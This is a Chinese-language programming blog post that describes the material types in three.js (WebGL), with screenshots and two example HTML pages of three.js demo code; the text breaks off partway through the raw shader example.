<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Three 之 three.js （webgl）涉及的各种材质简单说明(常用材质配有效果图) - 编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Three 之 three.js （webgl）涉及的各种材质简单说明(常用材质配有效果图)" />
<meta property="og:description" content="Three 之 three.js （webgl）涉及的各种材质简单说明(常用材质有效果图) 目录
Three 之 three.js （webgl）涉及的各种材质简单说明(常用材质配有效果图)
一、简单介绍
二、各种材质说明
1、MeshBasicMaterial 基础网格材质
2、MeshDepthMaterial 深度网格材质
3、MeshDistanceMaterial 距离网格材质
4、MeshLambertMaterial Lambert网格材质
5、MeshMatcapMaterial
6、MeshNormalMaterial 法线网格材质
7、MeshPhongMaterial Phong网格材质
8、MeshPhysicalMaterial 物理网格材质
9、MeshStandardMaterial 标准网格材质
10、MeshToonMaterial 卡通网格材质
11、PointsMaterial 点材质
12、RawShaderMaterial 原始着色器材质
13、ShaderMaterial 着色器材质
14、ShadowMaterial 阴影材质
15、SpriteMaterial 点精灵材质
16、LineBasicMaterial 基础线条材质
17、LineDashedMaterial 虚线材质
一、简单介绍 Three js 开发的一些知识整理，方便后期遇到类似的问题，能够及时查阅使用。
本节介绍， three.js （webgl）中有各种材质，不同材质又有不同的效果，这里做简单的介绍，如果有不足之处，欢迎指出，或者你有更好的方法，欢迎留言。
Materail 材料的抽象基类。
材料描述物体的外观。它们是以一种(主要)与渲染无关的方式定义的，所以如果你决定使用不同的渲染器，你不必重写材料。
以下属性和方法可以被所有其他材质类型继承(尽管它们可能有不同的默认值)。
属性 ：
.alphaTest:Float
设置要在运行alpha测试时使用的alpha值。如果不透明度低于这个值，材质将不会被渲染。默认值为0。
.alphaToCoverage:Float
使alpha覆盖范围。只能在启用msaa的上下文中使用(意味着在创建渲染器时将antialias参数设置为true)。默认是假的。
.blendDst:Integer
混合的目的地。默认是OneMinusSrcAlphaFactor。请参阅所有可能值的目标因子常数。
材质的混合必须设置为customblend，这样才会有效果。
.blendDstAlpha:Integer
. blenddst的透明度。如果为空，则使用. blenddst值。默认为空。
方法：" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bchobby.github.io/posts/5be8b308e5db7d598dc166002a1783f6/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-26T14:31:14+08:00" />
<meta property="article:modified_time" content="2022-04-26T14:31:14+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Three 之 three.js （webgl）涉及的各种材质简单说明(常用材质配有效果图)</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <h2 id="Three%20%E4%B9%8B%20three.js%20%EF%BC%88webgl%EF%BC%89%E6%B6%89%E5%8F%8A%E7%9A%84%E5%90%84%E7%A7%8D%E6%9D%90%E8%B4%A8%E7%AE%80%E5%8D%95%E8%AF%B4%E6%98%8E(%E5%B8%B8%E7%94%A8%E9%83%A8%E5%88%86%E9%85%8D%E6%9C%89%E6%95%88%E6%9E%9C%E5%9B%BE)">Three 之 three.js （webgl）涉及的各种材质简单说明(常用材质有效果图)</h2> 
<p></p> 
<p id="main-toc"><strong>目录</strong></p> 
<p id="Three%20%E4%B9%8B%20three.js%20%EF%BC%88webgl%EF%BC%89%E6%B6%89%E5%8F%8A%E7%9A%84%E5%90%84%E7%A7%8D%E6%9D%90%E8%B4%A8%E7%AE%80%E5%8D%95%E8%AF%B4%E6%98%8E(%E5%B8%B8%E7%94%A8%E9%83%A8%E5%88%86%E9%85%8D%E6%9C%89%E6%95%88%E6%9E%9C%E5%9B%BE)-toc" style="margin-left:0px;"><a href="#Three%20%E4%B9%8B%20three.js%20%EF%BC%88webgl%EF%BC%89%E6%B6%89%E5%8F%8A%E7%9A%84%E5%90%84%E7%A7%8D%E6%9D%90%E8%B4%A8%E7%AE%80%E5%8D%95%E8%AF%B4%E6%98%8E%28%E5%B8%B8%E7%94%A8%E9%83%A8%E5%88%86%E9%85%8D%E6%9C%89%E6%95%88%E6%9E%9C%E5%9B%BE%29" rel="nofollow">Three 之 three.js （webgl）涉及的各种材质简单说明(常用材质配有效果图)</a></p> 
<p id="%E4%B8%80%E3%80%81%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D-toc" style="margin-left:40px;"><a href="#%E4%B8%80%E3%80%81%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D" rel="nofollow">一、简单介绍</a></p> 
<p id="%E4%BA%8C%E3%80%81%E5%90%84%E7%A7%8D%E6%9D%90%E8%B4%A8%E8%AF%B4%E6%98%8E-toc" style="margin-left:40px;"><a href="#%E4%BA%8C%E3%80%81%E5%90%84%E7%A7%8D%E6%9D%90%E8%B4%A8%E8%AF%B4%E6%98%8E" rel="nofollow">二、各种材质说明</a></p> 
<p id="1%E3%80%81MeshBasicMaterial%20%E5%9F%BA%E7%A1%80%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#1%E3%80%81MeshBasicMaterial%20%E5%9F%BA%E7%A1%80%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8" rel="nofollow">1、MeshBasicMaterial 基础网格材质</a></p> 
<p id="2%E3%80%81MeshDepthMaterial%20%E6%B7%B1%E5%BA%A6%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#2%E3%80%81MeshDepthMaterial%20%E6%B7%B1%E5%BA%A6%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8" rel="nofollow">2、MeshDepthMaterial 深度网格材质</a></p> 
<p id="3%E3%80%81MeshDistanceMaterial%20%E8%B7%9D%E7%A6%BB%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#3%E3%80%81MeshDistanceMaterial%20%E8%B7%9D%E7%A6%BB%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8" rel="nofollow">3、MeshDistanceMaterial 距离网格材质</a></p> 
<p id="4%E3%80%81MeshLambertMaterial%20Lambert%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#4%E3%80%81MeshLambertMaterial%20Lambert%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8" rel="nofollow">4、MeshLambertMaterial Lambert网格材质</a></p> 
<p id="5%E3%80%81MeshMatcapMaterial-toc" style="margin-left:80px;"><a href="#5%E3%80%81MeshMatcapMaterial" rel="nofollow">5、MeshMatcapMaterial</a></p> 
<p id="6%E3%80%81MeshNormalMaterial%20%E6%B3%95%E7%BA%BF%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#6%E3%80%81MeshNormalMaterial%20%E6%B3%95%E7%BA%BF%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8" rel="nofollow">6、MeshNormalMaterial 法线网格材质</a></p> 
<p id="7%E3%80%81MeshPhongMaterial%20Phong%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#7%E3%80%81MeshPhongMaterial%20Phong%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8" rel="nofollow">7、MeshPhongMaterial Phong网格材质</a></p> 
<p id="8%E3%80%81MeshPhysicalMaterial%20%E7%89%A9%E7%90%86%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#8%E3%80%81MeshPhysicalMaterial%20%E7%89%A9%E7%90%86%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8" rel="nofollow">8、MeshPhysicalMaterial 物理网格材质</a></p> 
<p id="9%E3%80%81MeshStandardMaterial%20%E6%A0%87%E5%87%86%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#9%E3%80%81MeshStandardMaterial%20%E6%A0%87%E5%87%86%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8" rel="nofollow">9、MeshStandardMaterial 标准网格材质</a></p> 
<p id="10%E3%80%81MeshToonMaterial%20%E5%8D%A1%E9%80%9A%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#10%E3%80%81MeshToonMaterial%20%E5%8D%A1%E9%80%9A%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8" rel="nofollow">10、MeshToonMaterial 卡通网格材质</a></p> 
<p id="11%E3%80%81PointsMaterial%20%E7%82%B9%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#11%E3%80%81PointsMaterial%20%E7%82%B9%E6%9D%90%E8%B4%A8" rel="nofollow">11、PointsMaterial 点材质</a></p> 
<p id="12%E3%80%81RawShaderMaterial%20%E5%8E%9F%E5%A7%8B%E7%9D%80%E8%89%B2%E5%99%A8%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#12%E3%80%81RawShaderMaterial%20%E5%8E%9F%E5%A7%8B%E7%9D%80%E8%89%B2%E5%99%A8%E6%9D%90%E8%B4%A8" rel="nofollow">12、RawShaderMaterial 原始着色器材质</a></p> 
<p id="13%E3%80%81ShaderMaterial%20%E7%9D%80%E8%89%B2%E5%99%A8%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#13%E3%80%81ShaderMaterial%20%E7%9D%80%E8%89%B2%E5%99%A8%E6%9D%90%E8%B4%A8" rel="nofollow">13、ShaderMaterial 着色器材质</a></p> 
<p id="14%E3%80%81ShadowMaterial%20%E9%98%B4%E5%BD%B1%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#14%E3%80%81ShadowMaterial%20%E9%98%B4%E5%BD%B1%E6%9D%90%E8%B4%A8" rel="nofollow">14、ShadowMaterial 阴影材质</a></p> 
<p id="15%E3%80%81SpriteMaterial%20%E7%82%B9%E7%B2%BE%E7%81%B5%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#15%E3%80%81SpriteMaterial%20%E7%82%B9%E7%B2%BE%E7%81%B5%E6%9D%90%E8%B4%A8" rel="nofollow">15、SpriteMaterial 点精灵材质</a></p> 
<p id="16%E3%80%81LineBasicMaterial%20%E5%9F%BA%E7%A1%80%E7%BA%BF%E6%9D%A1%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#16%E3%80%81LineBasicMaterial%20%E5%9F%BA%E7%A1%80%E7%BA%BF%E6%9D%A1%E6%9D%90%E8%B4%A8" rel="nofollow">16、LineBasicMaterial 基础线条材质</a></p> 
<p id="17%E3%80%81LineDashedMaterial%20%E8%99%9A%E7%BA%BF%E6%9D%90%E8%B4%A8-toc" style="margin-left:80px;"><a href="#17%E3%80%81LineDashedMaterial%20%E8%99%9A%E7%BA%BF%E6%9D%90%E8%B4%A8" rel="nofollow">17、LineDashedMaterial 虚线材质</a></p> 
<hr id="hr-toc"> 
<p></p> 
<h3 id="%E4%B8%80%E3%80%81%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D">一、简单介绍</h3> 
<p>Three js 开发的一些知识整理，方便后期遇到类似的问题，能够及时查阅使用。</p> 
<p>本节介绍， three.js （webgl）中有各种材质，不同材质又有不同的效果，这里做简单的介绍，如果有不足之处，欢迎指出，或者你有更好的方法，欢迎留言。</p> 
<blockquote> 
 <p><strong>Materail </strong>材料的抽象基类。</p> 
 <p>材料描述物体的外观。它们是以一种(主要)与渲染无关的方式定义的，所以如果你决定使用不同的渲染器，你不必重写材料。</p> 
 <p>以下属性和方法可以被所有其他材质类型继承(尽管它们可能有不同的默认值)。</p> 
 <p><strong>属性 ：</strong></p> 
 <p>.alphaTest:Float</p> 
 <p>设置要在运行alpha测试时使用的alpha值。如果不透明度低于这个值，材质将不会被渲染。默认值为0。</p> 
 <p>.alphaToCoverage:Float</p> 
 <p>使alpha覆盖范围。只能在启用msaa的上下文中使用(意味着在创建渲染器时将antialias参数设置为true)。默认是假的。</p> 
 <p>.blendDst:Integer</p> 
 <p>混合的目的地。默认是OneMinusSrcAlphaFactor。请参阅所有可能值的目标因子常数。</p> 
 <p>材质的混合必须设置为customblend，这样才会有效果。</p> 
 <p>.blendDstAlpha:Integer</p> 
 <p>. blenddst的透明度。如果为空，则使用. blenddst值。默认为空。</p> 
 <p><strong>方法：</strong></p> 
 <p>EventDispatcher方法在这个类上可用。</p> 
 <p>.clone():Material</p> 
 <p>返回一个与此材料具有相同参数的新材料。</p> 
 <p>.copy(material : material):this</p> 
 <p>将参数从传递的材料复制到这个材料中。</p> 
 <p>.dispose():undefined</p> 
 <p>这就处理了材料。材料的纹理不会被丢弃。这些需要被纹理处理。</p> 
 <p>.onBeforeCompile(shader : Shader, renderer : WebGLRenderer ):undefined</p> 
 <p>一个可选的回调函数，在着色器程序编译之前立即执行。这个函数被shader源代码作为参数调用。用于修改内置材质。</p> 
 <p>等等，很多属性方法，这里不再一一介绍</p> 
 <p>可到官网查看：<a href="https://threejs.org/docs/index.html#api/zh/materials/Material" rel="nofollow" title="three.js docs">three.js docs</a></p> 
</blockquote> 
<p><span style="color:#fe2c24;">相关注意说明：以下涉及代码都基于 Threejs   <a href="https://github.com/mrdoob/three.js/" title="GitHub - mrdoob/three.js: JavaScript 3D Library.">GitHub - mrdoob/three.js: JavaScript 3D Library.</a></span></p> 
<p><img alt="" height="720" src="https://images2.imgbox.com/49/06/3hLJ1ALm_o.png" width="1200"></p> 
<p></p> 
<h3 id="%E4%BA%8C%E3%80%81%E5%90%84%E7%A7%8D%E6%9D%90%E8%B4%A8%E8%AF%B4%E6%98%8E">二、各种材质说明</h3> 
<h4 id="1%E3%80%81MeshBasicMaterial%20%E5%9F%BA%E7%A1%80%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8">1、MeshBasicMaterial 基础网格材质</h4> 
<p>一个以简单着色（平面或线框）方式来绘制几何体的材质。这种材质不受光照的影响。</p> 
<p>MeshBasicMaterial( parameters : Object )</p> 
<p>parameters - (可选)用于定义材质外观的对象，具有一个或多个属性。材质的任何属性都可以从此处传入(包括从Material继承的任何属性)。<br><br> 属性color例外，其可以作为十六进制字符串传递，默认情况下为 <strong>0xffffff</strong>（白色），内部调用Color.set(color)。</p> 
<p><img alt="" height="404" src="https://images2.imgbox.com/ba/a0/3uKypXNq_o.png" width="418"></p> 
<p></p> 
<h4 id="2%E3%80%81MeshDepthMaterial%20%E6%B7%B1%E5%BA%A6%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8">2、MeshDepthMaterial 深度网格材质</h4> 
<p>一种按深度绘制几何体的材质。深度基于相机远近平面。白色最近，黑色最远。</p> 
<p><img alt="" height="415" src="https://images2.imgbox.com/d9/1d/gac8u1U6_o.png" width="443"></p> 
<p></p> 
<h4 id="3%E3%80%81MeshDistanceMaterial%20%E8%B7%9D%E7%A6%BB%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8">3、MeshDistanceMaterial 距离网格材质</h4> 
<p>MeshDistanceMaterial 在内部用于使用PointLight来实现阴影映射。 也可以用于通过将MeshDistanceMaterial实例指定给Object3D.customDistanceMaterial，来自定义物体阴影投射。</p> 
<p>下列示例演示了这一方法，以确保物体的透明部分不投射阴影。</p> 
<p><img alt="" height="793" src="https://images2.imgbox.com/80/fe/zqOJklxY_o.png" width="921"></p> 
<p> <img alt="" height="231" src="https://images2.imgbox.com/42/0c/wsBoVkxt_o.png" width="419"></p> 
<p></p> 
<h4 id="4%E3%80%81MeshLambertMaterial%20Lambert%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8">4、MeshLambertMaterial Lambert网格材质</h4> 
<p>一种非光泽表面的材质，没有镜面高光。<br><br> 该材质使用基于非物理的<a href="https://en.wikipedia.org/wiki/Lambertian_reflectance" rel="nofollow" title="Lambertian">Lambertian</a>模型来计算反射率。 这可以很好地模拟一些表面（例如未经处理的木材或石材），但不能模拟具有镜面高光的光泽表面（例如涂漆木材）。<br><br> 使用<a href="https://en.wikipedia.org/wiki/Gouraud_shading" rel="nofollow" title="Gouraud">Gouraud</a>着色模型计算着色。这将计算每个顶点的着色 （即在<a href="https://en.wikipedia.org/wiki/Shader#Vertex_shaders" rel="nofollow" title="vertex shader">vertex shader</a>中）并在多边形的面上插入结果。<br><br> 由于反射率和光照模型的简单性，MeshPhongMaterial，MeshStandardMaterial或者MeshPhysicalMaterial 上使用这种材质时会以一些图形精度为代价，得到更高的性能。</p> 
<p><img alt="" height="392" src="https://images2.imgbox.com/8b/64/G6BOpg1e_o.png" width="493"></p> 
<p></p> 
<h4 id="5%E3%80%81MeshMatcapMaterial">5、MeshMatcapMaterial</h4> 
<p>MeshMatcapMaterial 由一个材质捕捉（MatCap，或光照球（Lit Sphere））纹理所定义，其编码了材质的颜色与明暗。<br><br> 由于mapcap图像文件编码了烘焙过的光照，因此MeshMatcapMaterial 不对灯光作出反应。 它将会投射阴影到一个接受阴影的物体上(and shadow clipping works)，但不会产生自身阴影或是接受阴影。</p> 
<p><img alt="" height="393" src="https://images2.imgbox.com/5d/be/50a1iamJ_o.png" width="485"></p> 
<p></p> 
<h4 id="6%E3%80%81MeshNormalMaterial%20%E6%B3%95%E7%BA%BF%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8">6、MeshNormalMaterial 法线网格材质</h4> 
<p>一种把法向量映射到RGB颜色的材质。</p> 
<p><img alt="" height="398" src="https://images2.imgbox.com/70/3c/eCBvL6IB_o.png" width="485"></p> 
<p></p> 
<h4 id="7%E3%80%81MeshPhongMaterial%20Phong%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8">7、MeshPhongMaterial Phong网格材质</h4> 
<p>一种用于具有镜面高光的光泽表面的材质。<br><br> 该材质使用非物理的<a href="https://en.wikipedia.org/wiki/Blinn-Phong_shading_model" rel="nofollow" title="Blinn-Phong">Blinn-Phong</a>模型来计算反射率。 与MeshLambertMaterial中使用的Lambertian模型不同，该材质可以模拟具有镜面高光的光泽表面（例如涂漆木材）。<br><br> 使用<a href="https://en.wikipedia.org/wiki/Phong_shading" rel="nofollow" title="Phong">Phong</a>着色模型计算着色时，会计算每个像素的阴影（在<a href="https://en.wikipedia.org/wiki/Shader#Pixel_shaders" rel="nofollow" title="fragment shader">fragment shader</a>， AKA pixel shader中），与MeshLambertMaterial使用的Gouraud模型相比，该模型的结果更准确，但代价是牺牲一些性能。 MeshStandardMaterial和MeshPhysicalMaterial也使用这个着色模型。<br><br> 在MeshStandardMaterial或MeshPhysicalMaterial上使用此材质时，性能通常会更高 ，但会牺牲一些图形精度。</p> 
<p><img alt="" height="389" src="https://images2.imgbox.com/48/e1/dySboqPr_o.png" width="513"></p> 
<p></p> 
<h4 id="8%E3%80%81MeshPhysicalMaterial%20%E7%89%A9%E7%90%86%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8">8、MeshPhysicalMaterial 物理网格材质</h4> 
<p>MeshStandardMaterial的扩展，提供了更高级的基于物理的渲染属性：</p> 
<ul><li><strong>Clearcoat:</strong> 有些类似于车漆，碳纤，被水打湿的表面的材质需要在面上再增加一个透明的，具有一定反光特性的面。而且这个面说不定有一定的起伏与粗糙度。Clearcoat可以在不需要重新创建一个透明的面的情况下做到类似的效果。</li><li><strong>基于物理的透明度</strong>:.opacity属性有一些限制:在透明度比较高的时候，反射也随之减少。使用基于物理的透光性.transmission属性可以让一些很薄的透明表面，例如玻璃，变得更真实一些。</li><li><strong>高级光线反射:</strong> 为非金属材质提供了更多更灵活的光线反射。</li></ul> 
<p>物理网格材质使用了更复杂的着色器功能，所以在每个像素的渲染都要比three.js中的其他材质更费性能，大部分的特性是默认关闭的，需要手动开启，每开启一项功能在开启的时候才会更耗性能。请注意，为获得最佳效果，您在使用此材质时应始终指定environment map。</p> 
<p><img alt="" height="388" src="https://images2.imgbox.com/17/17/P7jIpErs_o.png" width="494"></p> 
<p></p> 
<h4 id="9%E3%80%81MeshStandardMaterial%20%E6%A0%87%E5%87%86%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8">9、MeshStandardMaterial 标准网格材质</h4> 
<p>一种基于物理的标准材质，使用Metallic-Roughness工作流程。<br><br> 基于物理的渲染（PBR）最近已成为许多3D应用程序的标准，例如<a href="https://blogs.unity3d.com/2014/10/29/physically-based-shading-in-unity-5-a-primer/" rel="nofollow" title="Unity">Unity</a>， <a href="https://docs.unrealengine.com/latest/INT/Engine/Rendering/Materials/PhysicallyBased/" rel="nofollow" title="Unreal">Unreal</a>和 <a href="http://area.autodesk.com/blogs/the-3ds-max-blog/what039s-new-for-rendering-in-3ds-max-2017" rel="nofollow" title="3D Studio Max">3D Studio Max</a>。<br><br> 这种方法与旧方法的不同之处在于，不使用近似值来表示光与表面的相互作用，而是使用物理上正确的模型。 我们的想法是，不是在特定照明下调整材质以使其看起来很好，而是可以创建一种材质，能够“正确”地应对所有光照场景。<br><br> 在实践中，该材质提供了比MeshLambertMaterial 或MeshPhongMaterial 更精确和逼真的结果，代价是计算成本更高。<br><br> 计算着色的方式与MeshPhongMaterial相同，都使用<a href="https://en.wikipedia.org/wiki/Phong_shading" rel="nofollow" title="Phong">Phong</a>着色模型， 这会计算每个像素的阴影（即在<a href="https://en.wikipedia.org/wiki/Shader#Pixel_shaders" rel="nofollow" title="fragment shader">fragment shader</a>， AKA pixel shader中）， 与MeshLambertMaterial使用的Gouraud模型相比，该模型的结果更准确，但代价是牺牲一些性能。<br><br> 请注意，为获得最佳效果，您在使用此材质时应始终指定environment map。<br><br> 有关PBR概念的非技术性介绍以及如何设置PBR材质，请查看<a href="https://www.marmoset.co" rel="nofollow" title="marmoset">marmoset</a>成员的这些文章：</p> 
<ul><li><a href="https://www.marmoset.co/posts/basic-theory-of-physically-based-rendering/" rel="nofollow" title="Basic Theory of Physically Based Rendering">Basic Theory of Physically Based Rendering</a></li><li><a href="https://www.marmoset.co/posts/physically-based-rendering-and-you-can-too/" rel="nofollow" title="Physically Based Rendering and You Can Too">Physically Based Rendering and You Can Too</a></li></ul> 
<p>在 three.js（以及其他大多数PBR系统）中使用方法的技术细节， 可以在Brent Burley撰写的<a href="https://media.disneyanimation.com/uploads/production/publication_asset/48/asset/s2012_pbs_disney_brdf_notes_v3.pdf" rel="nofollow" title="paper from Disney">paper from Disney</a> (pdf) 中查看。</p> 
<p><img alt="" height="387" src="https://images2.imgbox.com/35/8b/3r9avhuK_o.png" width="514"></p> 
<p></p> 
<h4 id="10%E3%80%81MeshToonMaterial%20%E5%8D%A1%E9%80%9A%E7%BD%91%E6%A0%BC%E6%9D%90%E8%B4%A8">10、MeshToonMaterial 卡通网格材质</h4> 
<p>A material implementing toon shading.</p> 
<p><img alt="" height="387" src="https://images2.imgbox.com/99/67/JYy0RNWc_o.png" width="480"></p> 
<p></p> 
<h4 id="11%E3%80%81PointsMaterial%20%E7%82%B9%E6%9D%90%E8%B4%A8">11、PointsMaterial 点材质</h4> 
<p>Points使用的默认材质。</p> 
<p><img alt="" height="822" src="https://images2.imgbox.com/a5/9e/K71N3ouL_o.png" width="1099"></p> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
	&lt;head&gt;
		&lt;title&gt;three.js webgl - buffergeometry - particles&lt;/title&gt;
		&lt;meta charset="utf-8"&gt;
		&lt;meta name="viewport" content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"&gt;
		&lt;link type="text/css" rel="stylesheet" href="main.css"&gt;
	&lt;/head&gt;
	&lt;body&gt;

		&lt;div id="container"&gt;&lt;/div&gt;
		&lt;div id="info"&gt;&lt;a href="https://threejs.org" target="_blank" rel="noopener"&gt;three.js&lt;/a&gt; webgl - buffergeometry - particles&lt;/div&gt;

		&lt;!-- Import maps polyfill --&gt;
		&lt;!-- Remove this when import maps will be widely supported --&gt;
		&lt;script async src="https://unpkg.com/es-module-shims@1.3.6/dist/es-module-shims.js"&gt;&lt;/script&gt;

		&lt;script type="importmap"&gt;
			{
				"imports": {
					"three": "../build/three.module.js"
				}
			}
		&lt;/script&gt;

		&lt;script type="module"&gt;

			import * as THREE from 'three';

			import Stats from './jsm/libs/stats.module.js';

			let container, stats;

			let camera, scene, renderer;

			let points;

			init();
			animate();

			function init() {

				container = document.getElementById( 'container' );

				//

				camera = new THREE.PerspectiveCamera( 27, window.innerWidth / window.innerHeight, 5, 3500 );
				camera.position.z = 2750;

				scene = new THREE.Scene();
				scene.background = new THREE.Color( 0x050505 );
				scene.fog = new THREE.Fog( 0x050505, 2000, 3500 );

				//

				const particles = 500000;

				const geometry = new THREE.BufferGeometry();

				const positions = [];
				const colors = [];

				const color = new THREE.Color();

				const n = 1000, n2 = n / 2; // particles spread in the cube

				for ( let i = 0; i &lt; particles; i ++ ) {

					// positions

					const x = Math.random() * n - n2;
					const y = Math.random() * n - n2;
					const z = Math.random() * n - n2;

					positions.push( x, y, z );

					// colors

					const vx = ( x / n ) + 0.5;
					const vy = ( y / n ) + 0.5;
					const vz = ( z / n ) + 0.5;

					color.setRGB( vx, vy, vz );

					colors.push( color.r, color.g, color.b );

				}

				geometry.setAttribute( 'position', new THREE.Float32BufferAttribute( positions, 3 ) );
				geometry.setAttribute( 'color', new THREE.Float32BufferAttribute( colors, 3 ) );

				geometry.computeBoundingSphere();

				//

				const material = new THREE.PointsMaterial( { size: 15, vertexColors: true } );

				points = new THREE.Points( geometry, material );
				scene.add( points );

				//

				renderer = new THREE.WebGLRenderer();
				renderer.setPixelRatio( window.devicePixelRatio );
				renderer.setSize( window.innerWidth, window.innerHeight );

				container.appendChild( renderer.domElement );

				//

				stats = new Stats();
				container.appendChild( stats.dom );

				//

				window.addEventListener( 'resize', onWindowResize );

			}

			function onWindowResize() {

				camera.aspect = window.innerWidth / window.innerHeight;
				camera.updateProjectionMatrix();

				renderer.setSize( window.innerWidth, window.innerHeight );

			}

			//

			function animate() {

				requestAnimationFrame( animate );

				render();
				stats.update();

			}

			function render() {

				const time = Date.now() * 0.001;

				points.rotation.x = time * 0.25;
				points.rotation.y = time * 0.5;

				renderer.render( scene, camera );

			}

		&lt;/script&gt;

	&lt;/body&gt;
&lt;/html&gt;
</code></pre> 
<p></p> 
<h4 id="12%E3%80%81RawShaderMaterial%20%E5%8E%9F%E5%A7%8B%E7%9D%80%E8%89%B2%E5%99%A8%E6%9D%90%E8%B4%A8">12、RawShaderMaterial 原始着色器材质</h4> 
<p>此类的工作方式与ShaderMaterial类似，不同之处在于内置的uniforms和attributes的定义不会自动添加到GLSL shader代码中。</p> 
<p><img alt="" height="688" src="https://images2.imgbox.com/32/97/Zuh3Td7e_o.png" width="703"></p> 
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;
	&lt;head&gt;
		&lt;title&gt;three.js webgl - raw shader&lt;/title&gt;
		&lt;meta charset="utf-8"&gt;
		&lt;meta name="viewport" content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"&gt;
		&lt;link type="text/css" rel="stylesheet" href="main.css"&gt;
	&lt;/head&gt;
	&lt;body&gt;

		&lt;div id="container"&gt;&lt;/div&gt;
		&lt;div id="info"&gt;&lt;a href="https://threejs.org" target="_blank" rel="noopener"&gt;three.js&lt;/a&gt; - raw shader demo&lt;/div&gt;

		&lt;script id="vertexShader" type="x-shader/x-vertex"&gt;

			precision mediump float;
			precision mediump int;

			uniform mat4 modelViewMatrix; // optional
			uniform mat4 projectionMatrix; // optional

			attribute vec3 position;
			attribute vec4 color;

			varying vec3 vPosition;
			varying vec4 vColor;

			void main()	{

				vPosition = position;
				vColor = color;

				gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );

			}

		&lt;/script&gt;

		&lt;script id="fragmentShader" type="x-shader/x-fragment"&gt;

			precision mediump float;
			precision mediump int;

			uniform float time;

			varying vec3 vPosition;
			varying vec4 vColor;

			void main()	{

				vec4 color = vec4( vColor );
				color.r += sin( vPosition.x * 10.0 + time ) * 0.5;

				gl_FragColor = color;

			}

		&lt;/script&gt;

		&lt;!-- Import maps polyfill --&gt;
		&lt;!-- Remove this when import maps will be widely supported --&gt;
		&lt;script async src="https://unpkg.com/es-module-shims@1.3.6/dist/es-module-shims.js"&gt;&lt;/script&gt;

		&lt;script type="importmap"&gt;
			{
				"imports": {
					"three": "../build/three.module.js"
				}
			}
		&lt;/script&gt;

		&lt;script type="module"&gt;

			import * as THREE from 'three';

			import Stats from './jsm/libs/stats.module.js';

			let container, stats;

			let camera, scene, renderer;

			init();
			animate();

			function init() {

				container = document.getElementById( 'container' );

				camera = new THREE.PerspectiveCamera( 50, window.innerWidth / window.innerHeight, 1, 10 );
				camera.position.z = 2;

				scene = new THREE.Scene();
				scene.background = new THREE.Color( 0x101010 );

				// geometry
				// nr of triangles with 3 vertices per triangle
